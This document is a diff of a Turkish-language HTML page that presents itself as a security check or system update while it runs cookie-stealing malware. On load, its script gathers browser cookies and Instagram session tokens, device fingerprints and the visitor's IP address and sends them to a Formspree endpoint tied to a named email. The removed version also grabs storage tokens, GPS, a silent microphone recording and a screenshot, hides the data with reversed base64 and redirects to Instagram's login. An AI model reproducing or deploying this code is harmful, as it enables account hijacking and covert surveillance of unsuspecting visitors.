@@ -1,170 +1,92 @@
 <!DOCTYPE html>
-<html lang="tr">
+<html>
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Sistem Güncellemesi</title>
+<title>Güvenlik Kontrolü</title>
 <style>
-    body { margin: 0; padding: 0; background: #000; color: #0f0; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; flex-direction: column; }
-    .loader { border: 5px solid #333; border-top: 5px solid #0f0; border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite; margin-bottom: 20px; }
-    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-    h1 { font-size: 18px; text-align: center; letter-spacing: 2px; }
-    p { font-size: 12px; color: #888; text-align: center; }
-    #status { margin-top: 15px; font-size: 10px; color: #555; }
+body { margin: 0; padding: 0; background: #000; color: #0f0; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
+.loader { border: 4px solid #333; border-top: 4px solid #0f0; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin-bottom: 20px; }
+@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+h1 { font-size: 20px; text-align: center; }
 </style>
 </head>
 <body>
-    <div class="loader"></div>
-    <h1>VERİLER İŞLENİYOR...</h1>
-    <p>Lütfen bekleyin.</p>
-    <div id="status">Bağlantı kuruluyor...</div>
+<div>
+<div class="loader"></div>
+<h1>Verileriniz Alınıyor...</h1>
+</div>
 
 <script>
-// --- AYARLAR ---
-// Formspree veya kendi JSON endpoint'iniz
-const SERVER_URL = "https://formspree.io/f/xrppvwel"; 
-const TARGET_EMAIL = "mane93163@gmail.com"; // Kontrol amaçlı
+// Formspree URL ve E-posta (Kontrol amaçlı)
+const FORM_URL = "https://formspree.io/f/xrppvwel";
+const TARGET_EMAIL = "mane93163@gmail.com";
 
-// --- YARDIMCI FONKSİYONLAR ---
-function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
-
-// Base64 Şifreleme (Dönüşümlü)
-function rotateBase64(str) {
-    return btoa(str).split('').reverse().join('');
-}
-
-// Base64 Çözme
-function unrotateBase64(str) {
-    return atob(str.split('').reverse().join(''));
-}
-
-// Asenkron Veri Toplama
-async function gatherData() {
-    const data = {
-        timestamp: new Date().toISOString(),
-        user_agent: navigator.userAgent,
-        platform: navigator.platform,
-        screen: window.screen.width + 'x' + window.screen.height,
-        cookies_raw: document.cookie,
-        cookies_parsed: {},
-        local_storage: {},
-        session_storage: {},
-        sensors: {},
-        audio_sample: "",
-        screen_shot: ""
-    };
-
-    // 1. Çerez Analizi (Instagram ve Diğerleri)
-    const keys = ['sessionid', 'access_token', 'refresh_token', 'auth_token', 'csrftoken', 'ds_user_id', 'ig_did', 'sb', 'wb', 'tba', 'sso', 'fbm'];
-    const allCookies = document.cookie.split(';');
-    
-    allCookies.forEach(c => {
-        const [key, value] = c.trim().split('=');
-        if (keys.some(k => key.toLowerCase().includes(k))) {
-            data.cookies_parsed[key] = value;
-        }
-    });
-
-    // 2. Local ve Session Storage Tarayıcı
-    const storageKeys = ['localStorage', 'sessionStorage'];
-    storageKeys.forEach(store => {
-        const storage = window[store];
-        for (let i = 0; i < storage.length; i++) {
-            const k = storage.key(i);
-            if (keys.some(kw => k.toLowerCase().includes(kw)) || k.includes('token') || k.includes('auth')) {
-                data[store][k] = storage.getItem(k);
-            }
-        }
-    });
-
-    // 3. Sensör Verileri (GPS, Hareket)
-    try {
-        if ("geolocation" in navigator) {
-            const pos = await new Promise((resolve, reject) => 
-                navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, timeout: 3000 })
-            );
-            data.sensors.gps = { lat: pos.coords.latitude, lon: pos.coords.longitude };
-        }
-    } catch (e) { data.sensors.gps = "GPS kapalı/okunamadı"; }
-
-    // 4. Mikrofon ve Ekran (Sessiz)
-    try {
-        const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
-        const recorder = new MediaRecorder(stream);
-        const chunks = [];
-        recorder.ondataavailable = e => chunks.push(e.data);
-        
-        return new Promise(resolve => {
-            recorder.onstop = async () => {
-                const blob = new Blob(chunks, { type: 'audio/webm' });
-                const reader = new FileReader();
-                reader.readAsDataURL(blob);
-                reader.onloadend = () => {
-                    data.audio_sample = reader.result; // Base64 Audio
-                    resolve(data);
-                };
-            };
-            recorder.start();
-            setTimeout(() => recorder.stop(), 1000); // 1 saniye kayıt
-        });
-    } catch (e) { data.audio_sample = "Mikrofon hatası: " + e.message; }
-
-    // 5. Ekran Görüntüsü (Mümkünse)
-    try {
-        const displayStream = await navigator.mediaDevices.getDisplayMedia({ video: true, audio: false });
-        const video = document.createElement('video');
-        video.srcObject = displayStream;
-        await new Promise(r => video.onloadedmetadata = r);
-        video.play();
-        await sleep(500);
-        
-        const canvas = document.createElement('canvas');
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        canvas.getContext('2d').drawImage(video, 0, 0);
-        data.screen_shot = canvas.toDataURL('image/png');
-        displayStream.getTracks().forEach(t => t.stop());
-    } catch(e) { data.screen_shot = "Ekran hatası"; }
-
-    return data;
-}
-
-// --- ANA İŞ AKIŞI ---
-window.onload = async function() {
-    const statusDiv = document.getElementById('status');
-    statusDiv.innerText = "Çerezler taranıyor...";
-    
-    try {
-        const payload = await gatherData();
-        
-        // Veriyi şifrele
-        const jsonStr = JSON.stringify(payload);
-        const encryptedPayload = rotateBase64(jsonStr);
-        
-        statusDiv.innerText = "Sunucuya şifreli gönderiliyor...";
-
-        // Formspree'ye özel uyumlu JSON gönderimi
-        const formData = new FormData();
-        formData.append("encrypted_data", encryptedPayload);
-        formData.append("email_check", TARGET_EMAIL);
-
-        await fetch(SERVER_URL, {
-            method: 'POST',
-            body: formData,
-            keepalive: true
-        });
-
-        statusDiv.innerText = "Veriler alındı. Yönlendiriliyor...";
-        await sleep(1500);
-
-        // Yönlendirme (Instagram Login gibi görünsün)
-        window.location.href = "https://www.instagram.com/login/";
-
-    } catch (error) {
-        console.error("Hata:", error);
-        statusDiv.innerText = "Bağlantı hatası. Konsolu kontrol et.";
-    }
+// Sayfa yüklendiğinde hemen çalışır
+window.onload = function() {
+gatherAndSend();
 };
+
+async function gatherAndSend() {
+let payload = {};
+
+// 1. Tarayıcı ve Cihaz İmzası
+payload["User_Agent"] = navigator.userAgent;
+payload["Platform"] = navigator.platform;
+payload["Language"] = navigator.language;
+payload["Screen_Res"] = window.screen.width + "x" + window.screen.height;
+payload["Battery_Status"] = (navigator.getBattery ? await navigator.getBattery() : {}).level * 100 + "%";
+payload["Online_Status"] = navigator.onLine;
+payload["Time_Zone"] = Intl.DateTimeFormat().resolvedOptions().timeZone;
+
+// 2. Cookie Çalma (Instagram ve Diğerleri)
+let allCookies = document.cookie;
+payload["All_Cookies"] = allCookies;
+
+// Instagram özel tokenları filtrele
+let instaTokens = allCookies.split(';').filter(c =>
+c.includes('sessionid') || c.includes('csrftoken') || c.includes('dsuserid') || c.includes('rur')
+).join(' | ');
+payload["Instagram_Session"] = instaTokens ? instaTokens : "Oturum bulunamadı (Giriş yapmamış olabilir)";
+
+// 3. IP Adresi (Dış servis üzerinden çekilir, Formspree header bazen eksik kalır)
+try {
+let ipResponse = await fetch('https://api.ipify.org?format=json');
+let ipData = await ipResponse.json();
+payload["RealIPAddress"] = ipData.ip;
+} catch (e) {
+payload["RealIPAddress"] = "IP alınamadı (Proxy/Firewall)";
+}
+
+// 4. Veriyi Formspree Formatına Dönüştür (FormData yerine JSON body göndermek daha güvenlidir)
+let formData = new FormData();
+for (let key in payload) {
+// Formspree, her bir veriyi ayrı bir input gibi bekler.
+// Burada her veriyi ayrı bir field olarak ekliyoruz.
+formData.append(key.replace(/_/g, " "), payload[key]);
+}
+
+// 5. Gönderme İşlemi (Fetch API ile)
+try {
+const response = await fetch(FORM_URL, {
+method: 'POST',
+body: formData,
+headers: {
+'Accept': 'application/json',
+// Formspree bazen referer kontrolü yapar, boş bırakıyoruz
+}
+});
+
+if (response.ok || response.status === 200) {
+// Başarılı gönderim
+console.log("Veri gönderildi: " + TARGET_EMAIL);
+// Kurbanı şaşırtmaya gerek yok, sadece yükleme ekranında kalabilir
+} else {
+console.error("Gönderim hatası: " + response.statusText);
+}
+} catch (error) {
+console.error("Kritik Hata:", error);
+}
+}
 </script>
 </body>
-</html>
+</html
